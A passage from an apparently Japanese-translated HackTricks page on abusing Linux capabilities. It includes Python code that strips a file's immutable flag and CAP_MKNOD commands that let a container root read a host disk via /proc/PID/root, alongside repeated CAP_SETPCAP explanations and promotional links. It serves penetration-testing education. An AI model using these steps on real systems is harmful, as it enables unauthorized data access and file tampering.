ファイルが不変であり、pythonがこの能力を持っていることがわかった場合、**不変属性を削除してファイルを変更可能にすることができます：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
通常、この不変属性は次のコマンドを使用して設定および削除されます:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`chroot(2)` システムコールの実行を可能にし、既知の脆弱性を通じて `chroot(2)` 環境からの脱出を許可する可能性があります：

* [さまざまな chroot ソリューションからの脱出方法](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot 脱出ツール](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、特定のハードウェアプラットフォーム向けに調整された `LINUX_REBOOT_CMD_RESTART2` のような特定のコマンドを含むシステム再起動のための `reboot(2)` システムコールの実行を許可するだけでなく、新しいまたは署名されたクラッシュカーネルをそれぞれ読み込むために `kexec_load(2)` および Linux 3.17 以降の `kexec_file_load(2)` の使用を可能にします。

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、Linux 2.6.37 でより広範な **CAP_SYS_ADMIN** から分離され、`syslog(2)` コールを使用する能力を特に付与しました。この能力により、`kptr_restrict` 設定が 1 の場合に `/proc` や類似のインターフェースを介してカーネルアドレスを表示することが可能になります。Linux 2.6.39 以降、`kptr_restrict` のデフォルトは 0 であり、カーネルアドレスが公開されますが、多くのディストリビューションはセキュリティ上の理由からこれを 1（uid 0 以外からアドレスを隠す）または 2（常にアドレスを隠す）に設定しています。

さらに、**CAP_SYSLOG** は、`dmesg_restrict` が 1 に設定されている場合に `dmesg` 出力にアクセスすることを許可します。これらの変更にもかかわらず、**CAP_SYS_ADMIN** は歴史的な前例により `syslog` 操作を実行する能力を保持しています。

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常のファイル、FIFO（名前付きパイプ）、または UNIX ドメインソケットの作成を超えて `mknod` システムコールの機能を拡張します。特に、以下の特殊ファイルの作成を許可します：

- **S_IFCHR**: 端末のようなキャラクタ特殊ファイル。
- **S_IFBLK**: ディスクのようなブロック特殊ファイル。

この能力は、デバイスファイルを作成する能力を必要とするプロセスにとって不可欠であり、キャラクタまたはブロックデバイスを介して直接ハードウェアと対話することを容易にします。

これはデフォルトの Docker 機能です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

この能力は、以下の条件下でホスト上で特権昇格（フルディスク読み取りを通じて）を行うことを許可します：

1. ホストへの初期アクセスを持つ（特権なし）。
2. コンテナへの初期アクセスを持つ（特権あり（EUID 0）、および有効な `CAP_MKNOD`）。
3. ホストとコンテナは同じユーザー名前空間を共有する必要があります。

**コンテナ内でブロックデバイスを作成しアクセスする手順：**

1. **ホスト上で標準ユーザーとして：**
- `id` で現在のユーザーIDを確認します。例：`uid=1000(standarduser)`。
- 対象デバイスを特定します。例：`/dev/sdb`。

2. **コンテナ内で `root` として：**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **ホストに戻る:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
このアプローチにより、標準ユーザーはコンテナを通じて `/dev/sdb` からデータにアクセスし、潜在的に読み取ることができ、共有ユーザー名前空間とデバイスに設定された権限を利用します。

### CAP\_SETPCAP

**CAP_SETPCAP** は、プロセスが他のプロセスの **能力セットを変更する** ことを可能にし、効果的、継承可能、許可されたセットからの能力の追加または削除を許可します。ただし、プロセスは自分の許可されたセットに存在する能力のみを変更できるため、他のプロセスの特権を自分のもの以上に引き上げることはできません。最近のカーネルの更新により、これらのルールが厳格化され、`CAP_SETPCAP` は自分自身またはその子孫の許可されたセット内の能力を減少させることのみを許可され、セキュリティリスクを軽減することを目的としています。使用するには、効果的なセットに `CAP_SETPCAP` を持ち、ターゲットの能力を許可されたセットに持っている必要があり、`capset()` を使用して変更を行います。これが `CAP_SETPCAP` の核心的な機能と制限を要約し、特権管理とセキュリティ強化におけるその役割を強調しています。

**`CAP_SETPCAP`** は、プロセスが他のプロセスの **能力セットを変更する** ことを可能にするLinuxの能力です。他のプロセスの効果的、継承可能、許可された能力セットから能力を追加または削除する能力を付与します。ただし、この能力の使用方法には特定の制限があります。

`CAP_SETPCAP` を持つプロセスは、**自分の許可された能力セットにある能力のみを付与または削除できます**。言い換えれば、プロセスは自分がその能力を持っていない場合、他のプロセスにその能力を付与することはできません。この制限により、プロセスは他のプロセスの特権を自分の特権レベル以上に引き上げることができなくなります。

さらに、最近のカーネルバージョンでは、`CAP_SETPCAP` の能力が **さらに制限されました**。もはやプロセスが他のプロセスの能力セットを恣意的に変更することは許可されていません。代わりに、**自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を下げることのみを許可します**。この変更は、能力に関連する潜在的なセキュリティリスクを軽減するために導入されました。

`CAP_SETPCAP` を効果的に使用するには、効果的な能力セットにその能力を持ち、ターゲットの能力を許可された能力セットに持っている必要があります。その後、`capset()` システムコールを使用して他のプロセスの能力セットを変更できます。

要約すると、`CAP_SETPCAP` はプロセスが他のプロセスの能力セットを変更することを許可しますが、自分が持っていない能力を付与することはできません。さらに、セキュリティ上の懸念から、その機能は最近のカーネルバージョンで制限され、自分の許可された能力セットまたはその子孫の許可された能力セット内の能力を減少させることのみが許可されています。

## 参考文献

**これらの例のほとんどは** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **のいくつかのラボから取られたので、これらのプライベートエスカレーション技術を練習したい場合は、これらのラボをお勧めします。**

**その他の参考文献**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識を促進することを使命として**、この会議はあらゆる分野の技術とサイバーセキュリティの専門家の熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
</details>
{% endhint %}
